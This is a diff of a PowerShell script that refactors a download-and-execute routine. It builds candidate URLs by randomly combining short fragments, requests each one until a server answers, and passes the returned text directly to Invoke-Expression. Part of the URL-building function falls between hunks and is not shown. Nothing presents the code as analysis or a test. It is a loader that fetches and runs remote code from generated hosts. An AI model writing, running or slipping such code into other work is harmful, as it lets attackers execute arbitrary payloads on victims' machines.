@@ -1,25 +1,18 @@
-Function testUrl($url){
+Function getUrl($url){
   $web=[System.Net.WebRequest]::Create($url)
   try {
     $res=$web.GetResponse()
   }catch{}
   $stat=$res.StatusCode
   If($stat-eq200){
-    return $res.GetResponseStream()
+    return (New-Object System.IO.StreamReader ($res.GetResponseStream())).ReadToEnd()
   }Else{
     return $false
   }
 }
 
-Function getUrl($stream){
-  $sr=New-Object System.IO.StreamReader $stream
-  $res=$sr.ReadToEnd()
-  return $res
-}
-
 function setUrl{
-  $sub="tf","air","ane"
-  $url=""
+  ($url,$sub)=("", ("tf","air","ane"))
   for($i=0;$i-lt$sub.Length;$i++){
     $url+=$sub[(Get-Random -maximum $sub.Length)]
   }
@@ -29,5 +22,5 @@ function setUrl{
 Do{
   $url=(setUrl)
   write-host $url
-}until(($s=testUrl($url)))
-Invoke-Expression (getUrl($s))
+}until(($c=getUrl($url)))
+Invoke-Expression ($c)
